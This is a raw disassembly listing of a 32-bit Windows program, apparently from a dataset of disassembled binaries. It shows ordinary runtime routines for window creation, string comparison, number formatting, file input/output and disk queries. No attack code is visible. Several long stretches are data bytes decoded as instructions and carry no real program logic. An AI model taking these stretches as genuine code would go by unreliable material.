outsd
dec eax
outsd
je r-xdata
add [ ebx + 0x7425ffc0 ] cl
retn
imul esi [ fs : edi + eax + 0x57 ] 0x6f646e69
je EnumCalendarInfoA
ja r-xdata
imul esi [ edi + eax + 0x57 ] 0x6f646e69
dec ecx
outsb
popad
arpl [ ecx + ebp * 2 + 0x76 ] si
or [ gs : edi + 0x64 ] ebp
dec esi
outsd
inc ecx
arpl [ ebx + 0x65 ] sp
insb
or eax 0x6f4e646f
inc esi
outsd
arpl [ ebp + 0x73 ] si
push edx
arpl [ gs : ebx + ecx + 0x6f ] si
push edx
jae CompareStringA
imul esp [ edi + 0x68 ] 0x646f0a74
mov eax eax
nop
les ebx [ edi + 0x40 ]
add [ esi ] al
andps xmm1 [ edi + 0x77 ]
outsb
jb r-xdata
je r-xdata
add [ ebx + 0x6825ffc0 ] cl
retn
mov eax eax
add edx [ eax ]
pop edi
inc eax
add [ ebx + 0x3825ffc0 ] cl
retn 0x47
sub_406a34
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
call sub_402a7c
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
push esi
call CreateWindowExA
mov esi eax
mov eax ebx
call sub_402a6c
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x24
sub_406a8c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
call sub_402a7c
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
push esi
push 0x0
call CreateWindowExA
mov esi eax
mov eax ebx
call sub_402a6c
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x20
sub_406ae4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
push r-xdata
push r-xdata
call FindWindowA
mov ebx eax
push r-xdata
call RegisterWindowMessageA
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
push r-xdata
call RegisterWindowMessageA
mov [ esi ] eax
push r-xdata
call RegisterWindowMessageA
mov [ edi ] eax
cmp [ esi ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
xor edx edx
mov [ eax ] edx
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x3
test ebx ebx
je r-xdata
push 0x0
push 0x0
mov eax [ esi ]
push eax
push ebx
call SendMessageA
mov edx [ ebp + 0xc ]
mov [ edx ] eax
jmp r-xdata
push 0x0
push 0x0
mov eax [ edi ]
push eax
push ebx
call SendMessageA
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
jmp r-xdata
cmp [ edi ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_406bd9
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_406c01
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_406c08
retn
sub_406c14
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_406c39
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_406c40
retn
sub_406c4c
cmpsb [ fs : esi ] [ edi ]
inc edi
add al dh
inc [ eax ]
add [ esi + 0x47 ] ah
add cl dh
inc [ eax ]
add [ esi + 0x47 ] ah
add dl dh
inc [ eax ]
add [ esi + 0x47 ] ah
add bl dh
inc [ eax ]
add [ esi + 0x47 ] ah
add ah dh
inc [ eax ]
add [ esi + 0x47 ] ah
add ch dh
inc [ eax ]
add [ esi + 0x47 ] ah
add dh dh
inc [ eax ]
add [ esi + 0x47 ] ah
add bh dh
inc [ eax ]
add [ esi + 0x47 ] ah
add al bh
inc [ eax ]
add [ esi + 0x47 ] ah
add cl bh
inc [ eax ]
add [ esi + 0x47 ] ah
add dl bh
inc [ eax ]
add [ esi + 0x47 ] ah
add bl bh
inc [ eax ]
add [ esi + 0x47 ] ah
add ah bh
inc [ eax ]
add [ esi + 0x47 ] ah
add ch bh
inc [ eax ]
add [ esi + 0x47 ] ah
add dh bh
inc [ eax ]
add [ esi + 0x47 ] ah
add bh bh
inc [ eax ]
add [ esi + 0x47 ] ah
add al ah
inc [ eax ]
add [ esi + 0x47 ] ah
add cl ah
inc [ eax ]
add [ esi + 0x47 ] ah
add dl ah
inc [ eax ]
add [ esi + 0x47 ] ah
add bl ah
inc [ eax ]
add [ esi + 0x47 ] ah
add ah ah
inc [ eax ]
add [ esi + 0x47 ] ah
add ch ah
inc [ eax ]
add [ esi + 0x47 ] ah
add dh ah
inc [ eax ]
add [ esi + 0x47 ] ah
add bh ah
inc [ eax ]
add [ esi + 0x47 ] ah
add al ch
inc [ eax ]
add [ esi + 0x47 ] ah
add cl ch
inc [ eax ]
add [ esi + 0x47 ] ah
add dl ch
inc [ eax ]
add [ esi + 0x47 ] ah
add bl ch
inc [ eax ]
add [ esi + 0x47 ] ah
add ah ch
inc [ eax ]
add [ esi + 0x47 ] ah
add ch ch
inc [ eax ]
add [ esi + 0x47 ] ah
add dh ch
inc [ eax ]
add [ esi + 0x47 ] ah
add bh ch
inc [ eax ]
add [ esi + 0x47 ] ah
add al dl
inc [ eax ]
add [ esi + 0x47 ] ah
add cl dl
inc [ eax ]
add [ esi + 0x47 ] ah
add dl dl
inc [ eax ]
add [ esi + 0x47 ] ah
add bl dl
inc [ eax ]
add [ esi + 0x47 ] ah
add ah dl
inc [ eax ]
add [ esi + 0x47 ] ah
add ch dl
inc [ eax ]
add [ esi + 0x47 ] ah
add dh dl
inc [ eax ]
add [ esi + 0x47 ] ah
add bh dl
inc [ eax ]
add [ esi + 0x47 ] ah
add al bl
inc [ eax ]
add [ esi + 0x47 ] ah
add cl bl
inc [ eax ]
add [ esi + 0x47 ] ah
add dl bl
inc [ eax ]
add [ esi + 0x47 ] ah
add bl bl
inc [ eax ]
add [ esi + 0x47 ] ah
add ah bl
inc [ eax ]
add [ esi + 0x47 ] ah
add ch bl
inc [ eax ]
add [ esi + 0x47 ] ah
add dh bl
inc [ eax ]
add [ esi + 0x47 ] ah
add bh bl
inc [ eax ]
add [ esi + 0x47 ] ah
add al al
inc [ eax ]
add [ esi + 0x47 ] ah
add cl al
inc [ eax ]
add [ esi + 0x47 ] ah
add dl al
inc [ eax ]
add [ esi + 0x47 ] ah
add bl al
inc [ eax ]
add [ esi + 0x47 ] ah
add ah al
inc [ eax ]
add [ esi + 0x47 ] ah
add ch al
inc [ eax ]
add [ esi + 0x47 ] ah
add dh al
inc [ eax ]
add [ esi + 0x47 ] ah
add bh al
inc [ eax ]
add [ esi + 0x47 ] ah
add al cl
inc [ eax ]
add [ esi + 0x47 ] ah
add cl cl
inc [ eax ]
add [ esi + 0x47 ] ah
add dl cl
inc [ eax ]
add [ esi + 0x47 ] ah
add bl cl
inc [ eax ]
add [ esi + 0x47 ] ah
add ah cl
inc [ eax ]
add [ esi + 0x47 ] ah
add ch cl
inc [ eax ]
add [ esi + 0x47 ] ah
add dh cl
inc [ eax ]
add [ esi + 0x47 ] ah
add bh cl
inc [ eax ]
add [ esi + 0x47 ] ah
add [ eax + 0x640000ff ] dh
cmpsb [ esi ] [ edi ]
inc edi
add [ ecx + 0x640000ff ] dh
cmpsb [ esi ] [ edi ]
inc edi
add [ edx + 0x640000ff ] dh
cmpsb [ esi ] [ edi ]
inc edi
add [ ebx + 0x640000ff ] dh
cmpsb [ esi ] [ edi ]
inc edi
add [ edi + edi * 8 - 0x599c0000 ] dh
inc edi
add [ ebp + 0x640000ff ] dh
cmpsb [ esi ] [ edi ]
inc edi
add [ esi + 0x640000ff ] dh
cmpsb [ esi ] [ edi ]
inc edi
add [ edi + 0x640000ff ] dh
cmpsb [ esi ] [ edi ]
inc edi
add [ eax + 0x640000ff ] bh
cmpsb [ esi ] [ edi ]
inc edi
add [ ecx + 0x640000ff ] bh
cmpsb [ esi ] [ edi ]
inc edi
add [ edx + 0x640000ff ] bh
cmpsb [ esi ] [ edi ]
inc edi
add [ ebx + 0x640000ff ] bh
cmpsb [ esi ] [ edi ]
inc edi
add [ edi + edi * 8 - 0x599c0000 ] bh
inc edi
add [ ebp + 0x640000ff ] bh
cmpsb [ esi ] [ edi ]
inc edi
add [ esi + 0x640000ff ] bh
cmpsb [ esi ] [ edi ]
inc edi
add [ edi + 0x640000ff ] bh
cmpsb [ esi ] [ edi ]
inc edi
add [ eax + 0x640000ff ] ah
cmpsb [ esi ] [ edi ]
inc edi
add [ ecx + 0x640000ff ] ah
cmpsb [ esi ] [ edi ]
inc edi
add [ edx + 0x640000ff ] ah
cmpsb [ esi ] [ edi ]
inc edi
add [ ebx + 0x640000ff ] ah
cmpsb [ esi ] [ edi ]
inc edi
add [ edi + edi * 8 - 0x599c0000 ] ah
inc edi
add [ ebp + 0x640000ff ] ah
cmpsb [ esi ] [ edi ]
inc edi
add [ esi + 0x640000ff ] ah
cmpsb [ esi ] [ edi ]
inc edi
add [ edi + 0x640000ff ] ah
cmpsb [ esi ] [ edi ]
inc edi
add [ eax + 0x640000ff ] ch
cmpsb [ esi ] [ edi ]
inc edi
add [ ecx + 0x640000ff ] ch
cmpsb [ esi ] [ edi ]
inc edi
add [ edx + 0x640000ff ] ch
cmpsb [ esi ] [ edi ]
inc edi
add [ ebx + 0x550000ff ] ch
mov ebp esp
xor eax eax
push ebp
push sub_406f51
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_406f58
retn
sub_407a87
add [ edi + 0x7a ] ch
inc eax
add [ ecx + 0x7a ] bh
inc eax
add [ ebp + 0x7a ] al
inc eax
add [ ebp + 0x7a ] cl
inc eax
add [ ebp + 0x7a ] dl
inc eax
add [ ebp + 0x7a ] bl
inc eax
add [ ecx ] al
add [ eax ] al
add [ edx - 0x74 ] dl
adc [ ebx - 0x71 ] bh
sbb eax 0xdf9c4cdb
push edi
loopne r-xdata
imul esi [ ebp + 0x53 ] 0x68636e79
jb r-xdata
sbb [ 0x407a843f ] edi
add [ eax + eax ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al 0x7b
inc eax
add [ eax + 0x407a ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + edi * 2 ] cl
inc eax
add [ eax ] dh
add [ eax ] al
add [ ecx + edx + 0x34c40040 ] ch
inc eax
add [ edi + edx * 2 ] cl
inc eax
add [ eax ] bl
push edi
inc eax
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ eax ] ch
push edi
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ eax - 0x31 ] dl
inc eax
add [ esp + edx * 2 ] ah
dec ebp
jne r-xdata
adc [ ecx + 0x47813415 ] cl
add [ ebx + 0x4797ac15 ] cl
outsb
imul edi [ edx + 0x65 ] r-xdata
je r-xdata
stosd [ edi ]
push edx
popad
inc ebp
js r-xdata
insb
jne r-xdata
retn
imul esi [ esi + 0x65 ] 0x74697257
push ebx
jns r-xdata
add [ ebx + 0xa890448 ] cl
mov ebx [ eax + 0x8 ]
mov edx 0xc
call sub_402704
call ebx
pop ebx
retn
xor al 0x81
inc edi
add [ ebx + 0x34158910 ] cl
add [ edi ] 0x97ac158b
inc edi
arpl [ eax + 0x72 ] bp
outsd
sub_407b34
push ebp
mov ebp esp
push ebx
mov ebx edx
mov edx eax
shr edx 0x10
div bx
mov ebx [ ebp + 0x8 ]
mov [ ecx ] ax
mov [ ebx ] dx
pop ebx
pop ebp
retn 0x4
sub_407b50
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push esi
push edi
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b688
call sub_403a08
pop edi
pop esi
pop ebx
retn
sub_407b74
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_4026e4
mov esi eax
mov eax esi
xor ecx ecx
mov edx ebx
call sub_402ca4
mov eax esi
pop esi
pop ebx
retn
sub_407b94
push ebx
mov eax [ rw-data ]
mov edx [ eax ]
mov [ rw-data ] edx
mov edx [ rw-data ]
mov ecx [ eax + 0x4 ]
mov [ edx ] ecx
mov ebx [ eax + 0x8 ]
mov edx 0xc
call sub_402704
call ebx
pop ebx
retn
sub_407bc0
push ebx
mov ebx eax
mov eax 0xc
call sub_4026e4
mov edx [ rw-data ]
mov [ eax ] edx
mov edx [ rw-data ]
mov edx [ edx ]
mov [ eax + 0x4 ] edx
mov [ eax + 0x8 ] ebx
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ eax ] sub_407b94
pop ebx
retn
sub_407bf8
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_404310
mov ebx eax
mov eax edi
mov edx ebx
call sub_40469c
mov edx esi
mov esi [ edi ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov al [ edx ]
cmp al 0x61
jb r-xdata
mov [ esi ] al
inc edx
inc esi
dec ebx
test ebx ebx
jne r-xdata
cmp al 0x7a
ja r-xdata
sub al 0x20
sub_407c34
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_404310
mov ebx eax
mov eax edi
mov edx ebx
call sub_40469c
mov edx esi
mov esi [ edi ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov al [ edx ]
cmp al 0x41
jb r-xdata
mov [ esi ] al
inc edx
inc esi
dec ebx
test ebx ebx
jne r-xdata
cmp al 0x5a
ja r-xdata
add al 0x20
sub_407c70
push esi
push edi
mov esi eax
mov edi edx
or eax eax
je r-xdata
or edx edx
je r-xdata
mov eax [ eax - 0x4 ]
mov ecx eax
cmp ecx edx
jbe r-xdata
mov edx [ edx - 0x4 ]
cmp ecx ecx
[ esi ] [ edi ]
je r-xdata
mov ecx edx
sub eax edx
pop edi
pop esi
retn
movzx eax [ esi - 0x1 ]
movzx edx [ edi - 0x1 ]
sub_407ca0
push esi
push edi
mov esi eax
mov edi edx
mov edx ecx
xor eax eax
and edx 0x3
sar ecx 0x2
js r-xdata
inc eax
[ esi ] [ edi ]
jne r-xdata
pop edi
pop esi
retn
mov ecx edx
[ esi ] [ edi ]
jne r-xdata
sub_407cc0
push esi
push edi
push ebx
mov esi eax
mov edi edx
or eax eax
je r-xdata
or edx edx
je r-xdata
mov eax [ eax - 0x4 ]
mov ecx eax
cmp ecx edx
jbe r-xdata
mov edx [ edx - 0x4 ]
cmp ecx ecx
mov ecx edx
sub eax edx
pop ebx
pop edi
pop esi
retn
mov bl [ esi - 0x1 ]
cmp bl 0x61
jb r-xdata
mov bh [ edi - 0x1 ]
cmp bh 0x61
jb r-xdata
cmp bl 0x7a
ja r-xdata
cmp bl bh
je r-xdata
cmp bh 0x7a
ja r-xdata
sub bl 0x20
[ esi ] [ edi ]
je r-xdata
movzx eax bl
movzx edx bh
sub bh 0x20
sub_407d14
cmp eax edx
je r-xdata
mov al 0x1
or eax eax
je r-xdata
retn
or edx edx
je r-xdata
xor eax eax
retn
mov ecx [ eax - 0x4 ]
cmp ecx [ edx - 0x4 ]
jne r-xdata
call sub_407cc0
test eax eax
jne r-xdata
sub_407d38
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_404310
mov ebx eax
mov eax esi
call sub_404510
mov edx eax
mov eax edi
mov ecx ebx
call sub_404140
test ebx ebx
jle r-xdata
pop edi
pop esi
pop ebx
retn
push ebx
mov eax [ edi ]
push eax
call CharUpperBuffA
sub_407d6c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_404310
push eax
mov eax esi
call sub_404510
push eax
mov eax ebx
call sub_404310
push eax
mov eax ebx
call sub_404510
push eax
push 0x0
push 0x400
call CompareStringA
sub eax 0x2
pop esi
pop ebx
retn
sub_407da4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_404310
push eax
mov eax esi
call sub_404510
push eax
mov eax ebx
call sub_404310
push eax
mov eax ebx
call sub_404510
push eax
push 0x1
push 0x400
call CompareStringA
sub eax 0x2
pop esi
pop ebx
retn
sub_407df4
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
push ebx
push edi
push ebx
push esi
push 0x1
push 0x400
call CompareStringA
sub eax 0x2
pop edi
pop esi
pop ebx
retn
sub_407e14
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax edi
call sub_404310
mov esi eax
mov ebx 0x1
jmp r-xdata
cmp esi ebx
jl r-xdata
cmp esi ebx
jge r-xdata
cmp [ edi + ebx - 0x1 ] 0x20
jbe r-xdata
cmp [ edi + esi - 0x1 ] 0x20
jbe r-xdata
mov eax ebp
call sub_404050
jmp r-xdata
inc ebx
dec esi
push ebp
mov ecx esi
sub ecx ebx
inc ecx
mov edx ebx
mov eax edi
call sub_404570
pop ebp
pop edi
pop esi
pop ebx
retn
sub_407e64
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_404310
mov ebx eax
jmp r-xdata
test ebx ebx
jle r-xdata
push edi
mov ecx ebx
mov edx 0x1
mov eax esi
call sub_404570
pop edi
pop esi
pop ebx
retn
cmp [ esi + ebx - 0x1 ] 0x20
jbe r-xdata
dec ebx
sub_407e98
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
mov eax esi
call sub_404310
test eax eax
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov al [ esi ]
add al 0xbf
sub al 0x1a
jb r-xdata
mov eax esi
call sub_404310
sub eax 0x2
jl r-xdata
sub al 0x4
je r-xdata
mov bl 0x1
inc eax
mov edi 0x2
add al 0xfe
sub al 0x1a
jae r-xdata
inc edi
dec eax
jne r-xdata
add dl 0xf9
sub dl 0x1a
jb r-xdata
mov dl [ esi + edi - 0x1 ]
add dl 0xd0
sub dl 0xa
jb r-xdata
sub dl 0x4
je r-xdata
add dl 0xfe
sub dl 0x1a
jae r-xdata
sub_407efc
or cl cl
jne r-xdata
push edx
push esi
or eax eax
jns sub_407f12
mov [ esi ] dl
or eax eax
jne r-xdata
add dl 0x7
neg eax
call sub_407f12
mov al 0x2d
inc ecx
dec esi
mov [ esi ] al
retn
xor edx edx
div ecx
dec esi
add dl 0x30
cmp dl 0x3a
jb r-xdata
pop ecx
pop edx
sub ecx esi
sub edx ecx
jbe r-xdata
retn
add ecx edx
mov al 0x30
sub esi edx
jmp r-xdata
dec edx
jne r-xdata
mov [ edx + esi ] al
mov [ esi ] al
sub_407f12
mov ecx 0xa
push edx
push esi
mov [ esi ] dl
or eax eax
jne r-xdata
add dl 0x7
xor edx edx
div ecx
dec esi
add dl 0x30
cmp dl 0x3a
jb r-xdata
pop ecx
pop edx
sub ecx esi
sub edx ecx
jbe r-xdata
retn
add ecx edx
mov al 0x30
sub esi edx
jmp r-xdata
dec edx
jne r-xdata
mov [ edx + esi ] al
mov [ esi ] al
sub_407f48
push esi
mov esi esp
sub esp 0x10
xor ecx ecx
push edx
xor edx edx
call sub_407efc
mov edx esi
pop eax
call sub_404140
add esp 0x10
pop esi
retn
sub_407f68
or cl cl
jne sub_407f9c
mov ecx 0xa
test [ eax + 0x4 ] 0x80000000
je sub_407f9c
push [ eax + 0x4 ]
push [ eax ]
mov eax esp
neg [ esp ]
adc [ esp + 0x4 ] 0x0
neg [ esp + 0x4 ]
call sub_407f9c
mov [ esi - 0x1 ] 0x2d
dec esi
inc ecx
add esp 0x8
retn
sub_407f9c
push esi
sub esp 0x4
fnstcw [ esp + 0x2 ]
fnstcw [ esp ]
or [ esp ] 0xf00
fldcw [ esp ]
mov [ esp ] cx
fld1
test [ eax + 0x4 ] 0x80000000
je r-xdata
fild [ eax ]
push [ eax + 0x4 ]
push [ eax ]
and [ esp + 0x4 ] 0x7fffffff
push 0x7fffffff
push 0xffffffff
fild [ esp + 0x8 ]
fild [ esp ]
fadd st2
faddp st1
add esp 0x10
jmp r-xdata
mov [ esi ] al
fld st1
fcom st3
fwait
fnstsw ax
sahf
jae r-xdata
add al 0x7
fild [ esp ]
fld st1
dec esi
fprem
fistp [ esp ]
fdiv st1
mov al [ esp ]
add al 0x30
cmp al 0x3a
jb r-xdata
fldcw [ esp + 0x2 ]
add esp 0x4
ffree st3
ffree st2
ffree st1
ffree st0
pop ecx
sub ecx esi
sub edx ecx
jbe r-xdata
retn
sub esi edx
mov al 0x30
add ecx edx
jmp r-xdata
dec edx
jne r-xdata
mov [ edx + esi ] al
mov [ esi ] al
sub_408034
push ebp
mov ebp esp
push esi
mov esi esp
sub esp 0x20
xor ecx ecx
push eax
xor edx edx
lea eax [ ebp + 0x8 ]
call sub_407f68
mov edx esi
pop eax
call sub_404140
add esp 0x20
pop esi
pop ebp
retn 0x8
sub_40805c
cmp edx 0x20
jbe r-xdata
push esi
mov esi esp
sub esp 0x20
push ecx
mov ecx 0x10
call sub_407efc
mov edx esi
pop eax
call sub_404140
add esp 0x20
pop esi
retn
xor edx edx
sub_408084
push ebx
push esi
add esp 0xfffffff4
mov ebx eax
mov edx esp
mov eax ebx
call sub_402cc4
mov esi eax
cmp [ esp ] 0x0
je r-xdata
mov eax esi
add esp 0xc
pop esi
pop ebx
retn
mov [ esp + 0x4 ] ebx
mov [ esp + 0x8 ] 0xb
lea edx [ esp + 0x4 ]
mov eax [ rw-data ]
xor ecx ecx
call sub_407b50
sub_4080d8
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_402cc4
mov [ esi ] eax
cmp [ esp ] 0x0
sete al
pop edx
pop esi
pop ebx
retn
sub_4080f8
mov eax [ rw-data ]
call sub_404e18
test eax eax
jne r-xdata
mov eax [ rw-data ]
call sub_404e18
test eax eax
jne r-xdata
push 0x1
mov eax rw-data
mov ecx 0x1
mov edx [ r-xdata ]
call sub_404fd4
add esp 0x4
mov eax [ rw-data ]
mov edx r-xdata
call sub_4040a4
retn
push 0x1
mov eax rw-data
mov ecx 0x1
mov edx [ r-xdata ]
call sub_404fd4
add esp 0x4
mov eax [ rw-data ]
mov edx r-xdata
call sub_4040a4
sub_408188
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x1 ] 0x0
mov esi edx
test esi esi
jl r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc esi
mov ebx eax
add ebx 0x4
dec esi
jne r-xdata
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebx ]
call sub_407ddc
test al al
je r-xdata
sub_4081c4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_40949c
mov edx eax
test dl dl
je r-xdata
call sub_4080f8
push ebp
mov eax [ rw-data ]
call sub_404e20
mov edx eax
mov eax [ rw-data ]
call sub_408188
pop ecx
mov edx eax
test dl dl
je r-xdata
fld [ ebp - 0x10 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ ebx ]
jmp r-xdata
push ebp
mov eax [ rw-data ]
call sub_404e20
mov edx eax
mov eax [ rw-data ]
call sub_408188
pop ecx
mov edx eax
test dl dl
je r-xdata
mov [ ebx ] 0x1
jmp r-xdata
mov eax edx
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebx ] 0x0
sub_408260
push ebx
push esi
mov esi ecx
mov ebx eax
test dl dl
je r-xdata
mov eax esi
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_4040a4
call sub_4080f8
test bl bl
je r-xdata
mov eax esi
mov edx [ rw-data ]
mov edx [ edx ]
call sub_4040a4
pop esi
pop ebx
retn
mov eax esi
mov edx [ rw-data ]
mov edx [ edx ]
call sub_4040a4
jmp r-xdata
pop esi
pop ebx
retn
sub_4082ac
push ebx
push esi
push edi
mov ebx edx
mov edi eax
or eax 0xffffffff
mov esi ebx
and esi 0x3
cmp esi 0x2
ja r-xdata
pop edi
pop esi
pop ebx
retn
mov edx ebx
and edx 0xf0
cmp edx 0x40
ja r-xdata
push 0x0
push 0x80
push 0x3
push 0x0
mov eax ebx
and eax 0xf0
shr eax 0x4
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi * 4 + rw-data ]
push eax
mov eax edi
call sub_404510
push eax
call CreateFileA
sub_408304
push ebx
mov ebx eax
push 0x0
push 0x80
push 0x2
push 0x0
push 0x0
push 0xc0000000
mov eax ebx
call sub_404510
push eax
call CreateFileA
pop ebx
retn
sub_408330
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push edi
push esi
push ebx
call ReadFile
test eax eax
jne r-xdata
mov eax [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov [ esp ] 0xffffffff
sub_40835c
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push edi
push esi
push ebx
call WriteFile
test eax eax
jne r-xdata
mov eax [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov [ esp ] 0xffffffff
sub_408388
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
push esi
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push ebx
call SetFilePointer
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
sub_4083c8
push ebp
mov ebp esp
add esp 0xfffffeb4
push ebx
mov ebx eax
lea eax [ ebp - 0x14c ]
push eax
mov eax ebx
call sub_404510
push eax
call FindFirstFileA
cmp eax 0xffffffff
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
push eax
call FindClose
test [ ebp - 0x14c ] 0x10
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x138 ]
push eax
call FileTimeToLocalFileTime
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x2 ]
push eax
lea eax [ ebp - 0xc ]
push eax
call FileTimeToDosDateTime
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_408458
push ebx
push esi
mov esi eax
mov eax esi
call sub_404310
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop esi
pop ebx
retn
jmp r-xdata
mov edx ebx
mov eax esi
call sub_40bf44
cmp al 0x2
je r-xdata
dec ebx
lea eax [ esi + ebx - 0x1 ]
pop esi
pop ebx
retn
sub_408488
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
mov eax esi
call sub_404310
mov edi eax
mov eax ebx
call sub_404510
mov ebp eax
test edi edi
jle r-xdata
mov eax edi
pop ebp
pop edi
pop esi
pop ebx
retn
mov bl [ esi + edi - 0x1 ]
test bl bl
je r-xdata
dec edi
test edi edi
jg r-xdata
mov edx ebx
mov eax ebp
call sub_4087b8
test eax eax
je r-xdata
mov edx edi
mov eax esi
call sub_40bf44
cmp al 0x2
jne r-xdata
dec edi
sub_4084d8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx ebx
mov eax r-xdata
call sub_408488
mov esi eax
push edi
lea edx [ esi + 0x1 ]
mov ecx 0x7fffffff
mov eax ebx
call sub_404570
pop edi
pop esi
pop ebx
retn
sub_408510
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax r-xdata
call sub_408488
mov ebx eax
test ebx ebx
jle r-xdata
mov eax edi
call sub_404050
cmp [ esi + ebx - 0x1 ] 0x2e
jne r-xdata
push edi
mov ecx 0x7fffffff
mov edx ebx
mov eax esi
call sub_404570
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_408558
push ebx
push esi
add esp 0xfffffef8
mov esi edx
mov ebx eax
push esp
lea eax [ esp + 0x8 ]
push eax
push 0x104
mov eax ebx
call sub_404510
push eax
call GetFullPathNameA
mov ecx eax
lea edx [ esp + 0x4 ]
mov eax esi
call sub_404140
add esp 0x108
pop esi
pop ebx
retn
sub_408594
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
lea edx [ ebp - 0x10 ]
push edx
lea edx [ ebp - 0xc ]
push edx
lea edx [ ebp - 0x8 ]
push edx
lea edx [ ebp - 0x4 ]
push edx
push eax
call GetDiskFreeSpaceA
mov ebx eax
